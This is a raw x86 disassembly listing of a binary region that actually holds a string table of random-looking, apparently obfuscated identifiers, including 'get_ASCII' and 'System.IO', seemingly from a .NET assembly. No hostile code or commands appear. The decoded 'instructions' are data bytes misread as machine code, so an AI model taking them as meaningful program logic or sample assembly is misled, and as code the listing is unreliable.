  407b7a:	7a 78                	jp     0x407bf4
  407b7c:	77 75                	ja     0x407bf3
  407b7e:	54                   	push   %esp
  407b7f:	6d                   	insl   (%dx),%es:(%edi)
  407b80:	46                   	inc    %esi
  407b81:	00 7a 58             	add    %bh,0x58(%edx)
  407b84:	68 5a 64 64 6b       	push   $0x6b64645a
  407b89:	42                   	inc    %edx
  407b8a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8b:	46                   	inc    %esi
  407b8c:	00 59 72             	add    %bl,0x72(%ecx)
  407b8f:	7a 5a                	jp     0x407beb
  407b91:	68 6f 53 4d 4a       	push   $0x4a4d536f
  407b96:	74 75                	je     0x407c0d
  407b98:	57                   	push   %edi
  407b99:	6f                   	outsl  %ds:(%esi),(%dx)
  407b9a:	46                   	inc    %esi
  407b9b:	00 58 64             	add    %bl,0x64(%eax)
  407b9e:	54                   	push   %esp
  407b9f:	59                   	pop    %ecx
  407ba0:	53                   	push   %ebx
  407ba1:	62 46 6b             	bound  %eax,0x6b(%esi)
  407ba4:	68 45 4b 61 67       	push   $0x67614b45
  407ba9:	4c                   	dec    %esp
  407baa:	47                   	inc    %edi
  407bab:	00 46 47             	add    %al,0x47(%esi)
  407bae:	66 6f                	outsw  %ds:(%esi),(%dx)
  407bb0:	49                   	dec    %ecx
  407bb1:	43                   	inc    %ebx
  407bb2:	75 65                	jne    0x407c19
  407bb4:	74 50                	je     0x407c06
  407bb6:	47                   	inc    %edi
  407bb7:	00 46 67             	add    %al,0x67(%esi)
  407bba:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbb:	65 6e                	outsb  %gs:(%esi),(%dx)
  407bbd:	65 58                	gs pop %eax
  407bbf:	4f                   	dec    %edi
  407bc0:	4a                   	dec    %edx
  407bc1:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc2:	47                   	inc    %edi
  407bc3:	00 48 52             	add    %cl,0x52(%eax)
  407bc6:	53                   	push   %ebx
  407bc7:	44                   	inc    %esp
  407bc8:	62 70 50             	bound  %esi,0x50(%eax)
  407bcb:	72 6f                	jb     0x407c3c
  407bcd:	7a 51                	jp     0x407c20
  407bcf:	77 47                	ja     0x407c18
  407bd1:	73 47                	jae    0x407c1a
  407bd3:	00 6a 71             	add    %ch,0x71(%edx)
  407bd6:	44                   	inc    %esp
  407bd7:	57                   	push   %edi
  407bd8:	76 6c                	jbe    0x407c46
  407bda:	53                   	push   %ebx
  407bdb:	46                   	inc    %esi
  407bdc:	4a                   	dec    %edx
  407bdd:	77 57                	ja     0x407c36
  407bdf:	75 74                	jne    0x407c55
  407be1:	5a                   	pop    %edx
  407be2:	73 47                	jae    0x407c2b
  407be4:	00 66 66             	add    %ah,0x66(%esi)
  407be7:	53                   	push   %ebx
  407be8:	56                   	push   %esi
  407be9:	53                   	push   %ebx
  407bea:	49                   	dec    %ecx
  407beb:	57                   	push   %edi
  407bec:	4f                   	dec    %edi
  407bed:	43                   	inc    %ebx
  407bee:	47                   	inc    %edi
  407bef:	74 47                	je     0x407c38
  407bf1:	00 49 63             	add    %cl,0x63(%ecx)
  407bf4:	63 4f 6b             	arpl   %ecx,0x6b(%edi)
  407bf7:	42                   	inc    %edx
  407bf8:	43                   	inc    %ebx
  407bf9:	4d                   	dec    %ebp
  407bfa:	74 47                	je     0x407c43
  407bfc:	00 6f 58             	add    %ch,0x58(%edi)
  407bff:	74 71                	je     0x407c72
  407c01:	59                   	pop    %ecx
  407c02:	6d                   	insl   (%dx),%es:(%edi)
  407c03:	49                   	dec    %ecx
  407c04:	7a 70                	jp     0x407c76
  407c06:	56                   	push   %esi
  407c07:	71 6e                	jno    0x407c77
  407c09:	75 47                	jne    0x407c52
  407c0b:	00 61 76             	add    %ah,0x76(%ecx)
  407c0e:	42                   	inc    %edx
  407c0f:	59                   	pop    %ecx
  407c10:	77 72                	ja     0x407c84
  407c12:	75 46                	jne    0x407c5a
  407c14:	48                   	dec    %eax
  407c15:	46                   	inc    %esi
  407c16:	43                   	inc    %ebx
  407c17:	48                   	dec    %eax
  407c18:	00 76 4b             	add    %dh,0x4b(%esi)
  407c1b:	56                   	push   %esi
  407c1c:	69 48 6b 4c 73 4c 78 	imul   $0x784c734c,0x6b(%eax),%ecx
  407c23:	66 63 48 00          	arpl   %cx,0x0(%eax)
  407c27:	47                   	inc    %edi
  407c28:	52                   	push   %edx
  407c29:	53                   	push   %ebx
  407c2a:	78 46                	js     0x407c72
  407c2c:	59                   	pop    %ecx
  407c2d:	56                   	push   %esi
  407c2e:	47                   	inc    %edi
  407c2f:	43                   	inc    %ebx
  407c30:	61                   	popa
  407c31:	47                   	inc    %edi
  407c32:	6b 48 00 41          	imul   $0x41,0x0(%eax),%ecx
  407c36:	64 41                	fs inc %ecx
  407c38:	42                   	inc    %edx
  407c39:	72 7a                	jb     0x407cb5
  407c3b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3c:	67 6a 52             	addr16 push $0x52
  407c3f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c40:	75 48                	jne    0x407c8a
  407c42:	00 64 4a 47          	add    %ah,0x47(%edx,%ecx,2)
  407c46:	58                   	pop    %eax
  407c47:	72 78                	jb     0x407cc1
  407c49:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4a:	6c                   	insb   (%dx),%es:(%edi)
  407c4b:	50                   	push   %eax
  407c4c:	5a                   	pop    %edx
  407c4d:	77 57                	ja     0x407ca6
  407c4f:	45                   	inc    %ebp
  407c50:	49                   	dec    %ecx
  407c51:	00 67 65             	add    %ah,0x65(%edi)
  407c54:	74 5f                	je     0x407cb5
  407c56:	41                   	inc    %ecx
  407c57:	53                   	push   %ebx
  407c58:	43                   	inc    %ebx
  407c59:	49                   	dec    %ecx
  407c5a:	49                   	dec    %ecx
  407c5b:	00 78 41             	add    %bh,0x41(%eax)
  407c5e:	69 76 64 52 6c 71 74 	imul   $0x74716c52,0x64(%esi),%esi
  407c65:	49                   	dec    %ecx
  407c66:	49                   	dec    %ecx
  407c67:	00 47 72             	add    %al,0x72(%edi)
  407c6a:	68 76 4d 6e 72       	push   $0x726e4d76
  407c6f:	51                   	push   %ecx
  407c70:	4b                   	dec    %ebx
  407c71:	49                   	dec    %ecx
  407c72:	00 62 69             	add    %ah,0x69(%edx)
  407c75:	5a                   	pop    %edx
  407c76:	6d                   	insl   (%dx),%es:(%edi)
  407c77:	68 67 75 50 4f       	push   $0x4f507567
  407c7c:	69 4e 49 00 4c 76 43 	imul   $0x43764c00,0x49(%esi),%ecx
  407c83:	41                   	inc    %ecx
  407c84:	6a 74                	push   $0x74
  407c86:	64 57                	fs push %edi
  407c88:	45                   	inc    %ebp
  407c89:	6c                   	insb   (%dx),%es:(%edi)
  407c8a:	67 44                	addr16 inc %esp
  407c8c:	59                   	pop    %ecx
  407c8d:	75 52                	jne    0x407ce1
  407c8f:	49                   	dec    %ecx
  407c90:	00 55 47             	add    %dl,0x47(%ebp)
  407c93:	6b 76 74 64          	imul   $0x64,0x74(%esi),%esi
  407c97:	51                   	push   %ecx
  407c98:	52                   	push   %edx
  407c99:	4d                   	dec    %ebp
  407c9a:	75 48                	jne    0x407ce4
  407c9c:	51                   	push   %ecx
  407c9d:	44                   	inc    %esp
  407c9e:	55                   	push   %ebp
  407c9f:	49                   	dec    %ecx
  407ca0:	00 55 4e             	add    %dl,0x4e(%ebp)
  407ca3:	50                   	push   %eax
  407ca4:	62 73 6c             	bound  %esi,0x6c(%ebx)
  407ca7:	70 6f                	jo     0x407d18
  407ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  407caa:	6a 62                	push   $0x62
  407cac:	61                   	popa
  407cad:	49                   	dec    %ecx
  407cae:	00 73 76             	add    %dh,0x76(%ebx)
  407cb1:	49                   	dec    %ecx
  407cb2:	43                   	inc    %ebx
  407cb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb4:	47                   	inc    %edi
  407cb5:	54                   	push   %esp
  407cb6:	66 4d                	dec    %bp
  407cb8:	64 49                	fs dec %ecx
  407cba:	00 6f 72             	add    %ch,0x72(%edi)
  407cbd:	61                   	popa
  407cbe:	44                   	inc    %esp
  407cbf:	67 78 46             	addr16 js 0x407d08
  407cc2:	45                   	inc    %ebp
  407cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  407cc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc5:	47                   	inc    %edi
  407cc6:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc7:	49                   	dec    %ecx
  407cc8:	00 44 47 41          	add    %al,0x41(%edi,%eax,2)
  407ccc:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccd:	4c                   	dec    %esp
  407cce:	5a                   	pop    %edx
  407ccf:	55                   	push   %ebp
  407cd0:	76 65                	jbe    0x407d37
  407cd2:	54                   	push   %esp
  407cd3:	6c                   	insb   (%dx),%es:(%edi)
  407cd4:	4a                   	dec    %edx
  407cd5:	70 70                	jo     0x407d47
  407cd7:	49                   	dec    %ecx
  407cd8:	00 4b 4f             	add    %cl,0x4f(%ebx)
  407cdb:	61                   	popa
  407cdc:	58                   	pop    %eax
  407cdd:	42                   	inc    %edx
  407cde:	67 41                	addr16 inc %ecx
  407ce0:	49                   	dec    %ecx
  407ce1:	4f                   	dec    %edi
  407ce2:	79 74                	jns    0x407d58
  407ce4:	49                   	dec    %ecx
  407ce5:	00 76 46             	add    %dh,0x46(%esi)
  407ce8:	5a                   	pop    %edx
  407ce9:	58                   	pop    %eax
  407cea:	5a                   	pop    %edx
  407ceb:	67 6d                	insl   (%dx),%es:(%di)
  407ced:	54                   	push   %esp
  407cee:	4b                   	dec    %ebx
  407cef:	4a                   	dec    %edx
  407cf0:	00 47 77             	add    %al,0x77(%edi)
  407cf3:	49                   	dec    %ecx
  407cf4:	47                   	inc    %edi
  407cf5:	4a                   	dec    %edx
  407cf6:	45                   	inc    %ebp
  407cf7:	45                   	inc    %ebp
  407cf8:	4d                   	dec    %ebp
  407cf9:	69 6c 62 45 50 4a 00 	imul   $0x65004a50,0x45(%edx,%eiz,2),%ebp
  407d00:	65 
  407d01:	5a                   	pop    %edx
  407d02:	50                   	push   %eax
  407d03:	69 4c 57 4c 4a 56 54 	imul   $0x5254564a,0x4c(%edi,%edx,2),%ecx
  407d0a:	52 
  407d0b:	53                   	push   %ebx
  407d0c:	4a                   	dec    %edx
  407d0d:	00 6b 75             	add    %ch,0x75(%ebx)
  407d10:	6a 69                	push   $0x69
  407d12:	6a 58                	push   $0x58
  407d14:	6a 44                	push   $0x44
  407d16:	65 79 6c             	gs jns 0x407d85
  407d19:	58                   	pop    %eax
  407d1a:	4a                   	dec    %edx
  407d1b:	00 45 4f             	add    %al,0x4f(%ebp)
  407d1e:	74 53                	je     0x407d73
  407d20:	54                   	push   %esp
  407d21:	78 75                	js     0x407d98
  407d23:	4d                   	dec    %ebp
  407d24:	4c                   	dec    %esp
  407d25:	74 64                	je     0x407d8b
  407d27:	61                   	popa
  407d28:	4a                   	dec    %edx
  407d29:	00 41 54             	add    %al,0x54(%ecx)
  407d2c:	48                   	dec    %eax
  407d2d:	4c                   	dec    %esp
  407d2e:	4d                   	dec    %ebp
  407d2f:	66 62 7a 42          	bound  %di,0x42(%edx)
  407d33:	4b                   	dec    %ebx
  407d34:	00 50 6e             	add    %dl,0x6e(%eax)
  407d37:	76 7a                	jbe    0x407db3
  407d39:	6d                   	insl   (%dx),%es:(%edi)
  407d3a:	50                   	push   %eax
  407d3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d3c:	49                   	dec    %ecx
  407d3d:	4e                   	dec    %esi
  407d3e:	75 74                	jne    0x407db4
  407d40:	4b                   	dec    %ebx
  407d41:	44                   	inc    %esp
  407d42:	4b                   	dec    %ebx
  407d43:	00 4f 6c             	add    %cl,0x6c(%edi)
  407d46:	71 54                	jno    0x407d9c
  407d48:	43                   	inc    %ebx
  407d49:	62 47 47             	bound  %eax,0x47(%edi)
  407d4c:	45                   	inc    %ebp
  407d4d:	4b                   	dec    %ebx
  407d4e:	00 4e 6c             	add    %cl,0x6c(%esi)
  407d51:	70 67                	jo     0x407dba
  407d53:	58                   	pop    %eax
  407d54:	59                   	pop    %ecx
  407d55:	64 61                	fs popa
  407d57:	46                   	inc    %esi
  407d58:	4c                   	dec    %esp
  407d59:	4b                   	dec    %ebx
  407d5a:	00 4c 61 51          	add    %cl,0x51(%ecx,%eiz,2)
  407d5e:	6a 68                	push   $0x68
  407d60:	73 49                	jae    0x407dab
  407d62:	69 77 72 46 50 4b 00 	imul   $0x4b5046,0x72(%edi),%esi
  407d69:	50                   	push   %eax
  407d6a:	4b                   	dec    %ebx
  407d6b:	4f                   	dec    %edi
  407d6c:	55                   	push   %ebp
  407d6d:	75 6d                	jne    0x407ddc
  407d6f:	59                   	pop    %ecx
  407d70:	4c                   	dec    %esp
  407d71:	74 76                	je     0x407de9
  407d73:	48                   	dec    %eax
  407d74:	66 56                	push   %si
  407d76:	4b                   	dec    %ebx
  407d77:	00 71 76             	add    %dh,0x76(%ecx)
  407d7a:	53                   	push   %ebx
  407d7b:	44                   	inc    %esp
  407d7c:	64 51                	fs push %ecx
  407d7e:	52                   	push   %edx
  407d7f:	57                   	push   %edi
  407d80:	6c                   	insb   (%dx),%es:(%edi)
  407d81:	7a 70                	jp     0x407df3
  407d83:	43                   	inc    %ebx
  407d84:	5a                   	pop    %edx
  407d85:	4b                   	dec    %ebx
  407d86:	00 51 59             	add    %dl,0x59(%ecx)
  407d89:	77 63                	ja     0x407dee
  407d8b:	6d                   	insl   (%dx),%es:(%edi)
  407d8c:	72 67                	jb     0x407df5
  407d8e:	58                   	pop    %eax
  407d8f:	70 4a                	jo     0x407ddb
  407d91:	71 6f                	jno    0x407e02
  407d93:	4b                   	dec    %ebx
  407d94:	00 48 51             	add    %cl,0x51(%eax)
  407d97:	55                   	push   %ebp
  407d98:	6d                   	insl   (%dx),%es:(%edi)
  407d99:	4e                   	dec    %esi
  407d9a:	56                   	push   %esi
  407d9b:	66 79 74             	data16 jns 0x407e12
  407d9e:	53                   	push   %ebx
  407d9f:	6d                   	insl   (%dx),%es:(%edi)
  407da0:	71 45                	jno    0x407de7
  407da2:	4c                   	dec    %esp
  407da3:	00 57 79             	add    %dl,0x79(%edi)
  407da6:	72 46                	jb     0x407dee
  407da8:	4a                   	dec    %edx
  407da9:	64 52                	fs push %edx
  407dab:	5a                   	pop    %edx
  407dac:	74 50                	je     0x407dfe
  407dae:	51                   	push   %ecx
  407daf:	4c                   	dec    %esp
  407db0:	00 70 66             	add    %dh,0x66(%eax)
  407db3:	42                   	inc    %edx
  407db4:	52                   	push   %edx
  407db5:	61                   	popa
  407db6:	4d                   	dec    %ebp
  407db7:	70 44                	jo     0x407dfd
  407db9:	74 61                	je     0x407e1c
  407dbb:	58                   	pop    %eax
  407dbc:	4c                   	dec    %esp
  407dbd:	00 43 74             	add    %al,0x74(%ebx)
  407dc0:	4c                   	dec    %esp
  407dc1:	4b                   	dec    %ebx
  407dc2:	61                   	popa
  407dc3:	74 6e                	je     0x407e33
  407dc5:	57                   	push   %edi
  407dc6:	4c                   	dec    %esp
  407dc7:	57                   	push   %edi
  407dc8:	78 6b                	js     0x407e35
  407dca:	4c                   	dec    %esp
  407dcb:	00 71 69             	add    %dh,0x69(%ecx)
  407dce:	6e                   	outsb  %ds:(%esi),(%dx)
  407dcf:	4b                   	dec    %ebx
  407dd0:	76 49                	jbe    0x407e1b
  407dd2:	4f                   	dec    %edi
  407dd3:	41                   	inc    %ecx
  407dd4:	6c                   	insb   (%dx),%es:(%edi)
  407dd5:	7a 73                	jp     0x407e4a
  407dd7:	6c                   	insb   (%dx),%es:(%edi)
  407dd8:	4c                   	dec    %esp
  407dd9:	00 6d 57             	add    %ch,0x57(%ebp)
  407ddc:	67 4a                	addr16 dec %edx
  407dde:	49                   	dec    %ecx
  407ddf:	76 6b                	jbe    0x407e4c
  407de1:	6b 43 70 72          	imul   $0x72,0x70(%ebx),%eax
  407de5:	6a 79                	push   $0x79
  407de7:	4c                   	dec    %esp
  407de8:	00 73 43             	add    %dh,0x43(%ebx)
  407deb:	74 76                	je     0x407e63
  407ded:	49                   	dec    %ecx
  407dee:	5a                   	pop    %edx
  407def:	4b                   	dec    %ebx
  407df0:	56                   	push   %esi
  407df1:	4e                   	dec    %esi
  407df2:	69 4b 47 6b 79 44 4d 	imul   $0x4d44796b,0x47(%ebx),%ecx
  407df9:	00 71 72             	add    %dh,0x72(%ecx)
  407dfc:	55                   	push   %ebp
  407dfd:	6b 7a 41 76          	imul   $0x76,0x41(%edx),%edi
  407e01:	47                   	inc    %edi
  407e02:	64 4f                	fs dec %edi
  407e04:	56                   	push   %esi
  407e05:	4d                   	dec    %ebp
  407e06:	00 47 58             	add    %al,0x58(%edi)
  407e09:	75 78                	jne    0x407e83
  407e0b:	68 63 72 73 62       	push   $0x62737263
  407e10:	50                   	push   %eax
  407e11:	68 42 5a 69 4d       	push   $0x4d695a42
  407e16:	00 58 56             	add    %bl,0x56(%eax)
  407e19:	67 67 53             	addr16 addr16 push %ebx
  407e1c:	68 55 72 74 72       	push   $0x72747255
  407e21:	55                   	push   %ebp
  407e22:	6f                   	outsl  %ds:(%esi),(%dx)
  407e23:	72 4d                	jb     0x407e72
  407e25:	00 77 7a             	add    %dh,0x7a(%edi)
  407e28:	79 69                	jns    0x407e93
  407e2a:	76 61                	jbe    0x407e8d
  407e2c:	78 79                	js     0x407ea7
  407e2e:	73 4d                	jae    0x407e7d
  407e30:	00 41 50             	add    %al,0x50(%ecx)
  407e33:	68 41 48 56 79       	push   $0x79564841
  407e38:	59                   	pop    %ecx
  407e39:	79 66                	jns    0x407ea1
  407e3b:	4e                   	dec    %esi
  407e3c:	00 53 79             	add    %dl,0x79(%ebx)
  407e3f:	73 74                	jae    0x407eb5
  407e41:	65 6d                	gs insl (%dx),%es:(%edi)
  407e43:	2e 49                	cs dec %ecx
  407e45:	4f                   	dec    %edi
  407e46:	00 52 57             	add    %dl,0x57(%edx)
  407e49:	61                   	popa
  407e4a:	62 42 71             	bound  %eax,0x71(%edx)
  407e4d:	69 64 4e 4f 00 55 72 	imul   $0x55725500,0x4f(%esi,%ecx,2),%esp
  407e54:	55 
  407e55:	7a 70                	jp     0x407ec7
  407e57:	69 6d 57 4d 64 45 56 	imul   $0x5645644d,0x57(%ebp),%ebp
  407e5e:	6a 4f                	push   $0x4f
  407e60:	00 69 58             	add    %ch,0x58(%ecx)
  407e63:	50                   	push   %eax
  407e64:	4f                   	dec    %edi
  407e65:	63 76 72             	arpl   %esi,0x72(%esi)
  407e68:	6f                   	outsl  %ds:(%esi),(%dx)
  407e69:	4a                   	dec    %edx
  407e6a:	4a                   	dec    %edx
  407e6b:	50                   	push   %eax
  407e6c:	6c                   	insb   (%dx),%es:(%edi)
  407e6d:	4f                   	dec    %edi
  407e6e:	00 43 56             	add    %al,0x56(%ebx)
  407e71:	4e                   	dec    %esi
  407e72:	73 74                	jae    0x407ee8
  407e74:	64 44                	fs inc %esp
  407e76:	41                   	inc    %ecx
  407e77:	4e                   	dec    %esi
  407e78:	78 42                	js     0x407ebc
  407e7a:	58                   	pop    %eax
  407e7b:	6b 45 50 00          	imul   $0x0,0x50(%ebp),%eax
  407e7f:	47                   	inc    %edi
  407e80:	6a 71                	push   $0x71
  407e82:	70 68                	jo     0x407eec
  407e84:	48                   	dec    %eax
  407e85:	6c                   	insb   (%dx),%es:(%edi)
  407e86:	6f                   	outsl  %ds:(%esi),(%dx)
  407e87:	56                   	push   %esi
  407e88:	4a                   	dec    %edx
  407e89:	54                   	push   %esp
  407e8a:	50                   	push   %eax
  407e8b:	00 75 53             	add    %dh,0x53(%ebp)
  407e8e:	66 69 69 79 47 4c    	imul   $0x4c47,0x79(%ecx),%bp
  407e94:	70 50                	jo     0x407ee6
  407e96:	00 6f 6b             	add    %ch,0x6b(%edi)
  407e99:	41                   	inc    %ecx
  407e9a:	62 53 66             	bound  %edx,0x66(%ebx)
  407e9d:	4a                   	dec    %edx
  407e9e:	64 4c                	fs dec %esp
  407ea0:	4f                   	dec    %edi
  407ea1:	50                   	push   %eax
  407ea2:	56                   	push   %esi
  407ea3:	76 50                	jbe    0x407ef5
  407ea5:	00 57 72             	add    %dl,0x72(%edi)
  407ea8:	53                   	push   %ebx
  407ea9:	62 4a 4f             	bound  %ecx,0x4f(%edx)
  407eac:	70 56                	jo     0x407f04
  407eae:	52                   	push   %edx
  407eaf:	58                   	pop    %eax
  407eb0:	7a 50                	jp     0x407f02
  407eb2:	00 5a 4d             	add    %bl,0x4d(%edx)
  407eb5:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb6:	54                   	push   %esp
  407eb7:	4c                   	dec    %esp
  407eb8:	48                   	dec    %eax
  407eb9:	42                   	inc    %edx
  407eba:	41                   	inc    %ecx
  407ebb:	5a                   	pop    %edx
  407ebc:	7a 50                	jp     0x407f0e
  407ebe:	00 55 6b             	add    %dl,0x6b(%ebp)
  407ec1:	55                   	push   %ebp
  407ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec3:	45                   	inc    %ebp
  407ec4:	52                   	push   %edx
  407ec5:	53                   	push   %ebx
  407ec6:	59                   	pop    %ecx
  407ec7:	73 4b                	jae    0x407f14
  407ec9:	5a                   	pop    %edx
  407eca:	52                   	push   %edx
  407ecb:	6a 44                	push   $0x44
  407ecd:	51                   	push   %ecx
  407ece:	00 5a 64             	add    %bl,0x64(%edx)
  407ed1:	63 46 67             	arpl   %eax,0x67(%esi)
  407ed4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ed5:	47                   	inc    %edi
  407ed6:	50                   	push   %eax
  407ed7:	49                   	dec    %ecx
  407ed8:	51                   	push   %ecx
  407ed9:	00 6f 49             	add    %ch,0x49(%edi)
  407edc:	62 61 68             	bound  %esp,0x68(%ecx)
  407edf:	45                   	inc    %ebp
  407ee0:	54                   	push   %esp
  407ee1:	73 52                	jae    0x407f35
  407ee3:	51                   	push   %ecx
  407ee4:	00 6a 70             	add    %ch,0x70(%edx)
  407ee7:	4d                   	dec    %ebp
  407ee8:	4a                   	dec    %edx
  407ee9:	46                   	inc    %esi
  407eea:	66 57                	push   %di
  407eec:	70 43                	jo     0x407f31
  407eee:	4a                   	dec    %edx
  407eef:	62 51 00             	bound  %edx,0x0(%ecx)
  407ef2:	6b 4b 7a 4e          	imul   $0x4e,0x7a(%ebx),%ecx
  407ef6:	77 49                	ja     0x407f41
  407ef8:	52                   	push   %edx
  407ef9:	54                   	push   %esp
  407efa:	54                   	push   %esp
  407efb:	59                   	pop    %ecx
  407efc:	64 62 6c 51 00       	bound  %ebp,%fs:0x0(%ecx,%edx,2)
  407f01:	46                   	inc    %esi
  407f02:	61                   	popa
  407f03:	67 46                	addr16 inc %esi
  407f05:	75 45                	jne    0x407f4c
  407f07:	78 6a                	js     0x407f73
  407f09:	77 51                	ja     0x407f5c
  407f0b:	00 64 68 58          	add    %ah,0x58(%eax,%ebp,2)
  407f0f:	74 63                	je     0x407f74
  407f11:	76 7a                	jbe    0x407f8d
  407f13:	6d                   	insl   (%dx),%es:(%edi)
  407f14:	4a                   	dec    %edx
  407f15:	6c                   	insb   (%dx),%es:(%edi)
  407f16:	48                   	dec    %eax
  407f17:	52                   	push   %edx
  407f18:	00 4a 43             	add    %cl,0x43(%edx)
  407f1b:	4c                   	dec    %esp
  407f1c:	63 4d 4a             	arpl   %ecx,0x4a(%ebp)
  407f1f:	61                   	popa
  407f20:	4b                   	dec    %ebx
  407f21:	59                   	pop    %ecx
  407f22:	49                   	dec    %ecx
  407f23:	52                   	push   %edx
  407f24:	00 4f 71             	add    %cl,0x71(%edi)
  407f27:	65 5a                	gs pop %edx
  407f29:	79 5a                	jns    0x407f85
  407f2b:	57                   	push   %edi
  407f2c:	47                   	inc    %edi
  407f2d:	70 73                	jo     0x407fa2
  407f2f:	61                   	popa
  407f30:	6c                   	insb   (%dx),%es:(%edi)
  407f31:	4a                   	dec    %edx
  407f32:	52                   	push   %edx
  407f33:	00 71 54             	add    %dh,0x54(%ecx)
  407f36:	67 59                	addr16 pop %ecx
  407f38:	75 44                	jne    0x407f7e
  407f3a:	6e                   	outsb  %ds:(%esi),(%dx)
  407f3b:	45                   	inc    %ebp
  407f3c:	57                   	push   %edi
  407f3d:	42                   	inc    %edx
  407f3e:	4d                   	dec    %ebp
  407f3f:	4f                   	dec    %edi
  407f40:	52                   	push   %edx
  407f41:	00 51 71             	add    %dl,0x71(%ecx)
  407f44:	6b 6c 6a 42 59       	imul   $0x59,0x42(%edx,%ebp,2),%ebp
  407f49:	4c                   	dec    %esp
  407f4a:	6a 49                	push   $0x49
  407f4c:	50                   	push   %eax
  407f4d:	52                   	push   %edx
  407f4e:	00 6c 47 6c          	add    %ch,0x6c(%edi,%eax,2)
  407f52:	58                   	pop    %eax
  407f53:	51                   	push   %ecx
  407f54:	78 70                	js     0x407fc6
  407f56:	5a                   	pop    %edx
  407f57:	5a                   	pop    %edx
  407f58:	46                   	inc    %esi
  407f59:	56                   	push   %esi
  407f5a:	51                   	push   %ecx
  407f5b:	52                   	push   %edx
  407f5c:	52                   	push   %edx
  407f5d:	00 41 6c             	add    %al,0x6c(%ecx)
  407f60:	4b                   	dec    %ebx
  407f61:	69 58 51 53 53 45 5a 	imul   $0x5a455353,0x51(%eax),%ebx
  407f68:	54                   	push   %esp
  407f69:	52                   	push   %edx
  407f6a:	00 43 6f             	add    %al,0x6f(%ebx)
  407f6d:	55                   	push   %ebp
  407f6e:	57                   	push   %edi
  407f6f:	69 4a 6a 55 4d 58 52 	imul   $0x52584d55,0x6a(%edx),%ecx
  407f76:	00 69 5a             	add    %ch,0x5a(%ecx)
  407f79:	45                   	inc    %ebp
  407f7a:	58                   	pop    %eax
  407f7b:	6b 49 42 71          	imul   $0x71,0x42(%ecx),%ecx
  407f7f:	62 68 4d             	bound  %ebp,0x4d(%eax)
  407f82:	64 52                	fs push %edx
  407f84:	00 58 76             	add    %bl,0x76(%eax)
  407f87:	57                   	push   %edi
  407f88:	72 67                	jb     0x407ff1
  407f8a:	43                   	inc    %ebx
  407f8b:	55                   	push   %ebp
  407f8c:	46                   	inc    %esi
  407f8d:	54                   	push   %esp
  407f8e:	7a 67                	jp     0x407ff7
  407f90:	52                   	push   %edx
  407f91:	00 4c 44 50          	add    %cl,0x50(%esp,%eax,2)
  407f95:	64 6a 4c             	fs push $0x4c
  407f98:	75 76                	jne    0x408010
  407f9a:	42                   	inc    %edx
  407f9b:	53                   	push   %ebx
  407f9c:	00 6c 57 64          	add    %ch,0x64(%edi,%edx,2)
  407fa0:	75 71                	jne    0x408013
  407fa2:	6b 44 4c 4c 5a       	imul   $0x5a,0x4c(%esp,%ecx,2),%eax
  407fa7:	4a                   	dec    %edx
  407fa8:	53                   	push   %ebx
  407fa9:	00 55 6a             	add    %dl,0x6a(%ebp)
  407fac:	68 51 6a 4b 4e       	push   $0x4e4b6a51
  407fb1:	70 4f                	jo     0x408002
  407fb3:	51                   	push   %ecx
  407fb4:	53                   	push   %ebx
  407fb5:	00 6a 72             	add    %ch,0x72(%edx)
  407fb8:	57                   	push   %edi
  407fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  407fba:	4c                   	dec    %esp
  407fbb:	55                   	push   %ebp
  407fbc:	6a 5a                	push   $0x5a
  407fbe:	4a                   	dec    %edx
  407fbf:	5a                   	pop    %edx
  407fc0:	51                   	push   %ecx
  407fc1:	69 6a 56 53 00 62 57 	imul   $0x57620053,0x56(%edx),%ebp
  407fc8:	43                   	inc    %ebx
  407fc9:	77 55                	ja     0x408020
  407fcb:	7a 73                	jp     0x408040
  407fcd:	76 47                	jbe    0x408016
  407fcf:	57                   	push   %edi
  407fd0:	4e                   	dec    %esi
  407fd1:	6a 53                	push   $0x53
  407fd3:	00 63 6c             	add    %ah,0x6c(%ebx)
  407fd6:	47                   	inc    %edi
  407fd7:	61                   	popa
  407fd8:	76 4c                	jbe    0x408026
  407fda:	76 69                	jbe    0x408045
  407fdc:	78 68                	js     0x408046
  407fde:	70 6f                	jo     0x40804f
  407fe0:	53                   	push   %ebx
  407fe1:	00 43 4b             	add    %al,0x4b(%ebx)
  407fe4:	4a                   	dec    %edx
  407fe5:	41                   	inc    %ecx
  407fe6:	71 43                	jno    0x40802b
  407fe8:	6a 68                	push   $0x68
  407fea:	62 71 53             	bound  %esi,0x53(%ecx)
  407fed:	00 55 62             	add    %dl,0x62(%ebp)
  407ff0:	70 73                	jo     0x408065
  407ff2:	76 5a                	jbe    0x40804e
  407ff4:	6c                   	insb   (%dx),%es:(%edi)
  407ff5:	71 64                	jno    0x40805b
  407ff7:	4b                   	dec    %ebx
  407ff8:	64 55                	fs push %ebp
  407ffa:	64 6b 75 53 00       	imul   $0x0,%fs:0x53(%ebp),%esi
  407fff:	6b 4e 6f 63          	imul   $0x63,0x6f(%esi),%ecx
  408003:	64 45                	fs inc %ebp
  408005:	4c                   	dec    %esp
  408006:	68 56 6a 76 68       	push   $0x68766a56
  40800b:	76 53                	jbe    0x408060
  40800d:	00 63 50             	add    %ah,0x50(%ebx)
  408010:	63 4f 45             	arpl   %ecx,0x45(%edi)
  408013:	6c                   	insb   (%dx),%es:(%edi)
  408014:	4b                   	dec    %ebx
  408015:	56                   	push   %esi
  408016:	78 53                	js     0x40806b
  408018:	00 61 61             	add    %ah,0x61(%ecx)
  40801b:	68 59 4f 66 47       	push   $0x47664f59
  408020:	45                   	inc    %ebp
  408021:	46                   	inc    %esi
  408022:	54                   	push   %esp
  408023:	00 41 61             	add    %al,0x61(%ecx)
  408026:	4a                   	dec    %edx
  408027:	67 67 45             	addr16 addr16 inc %ebp
  40802a:	71 78                	jno    0x4080a4
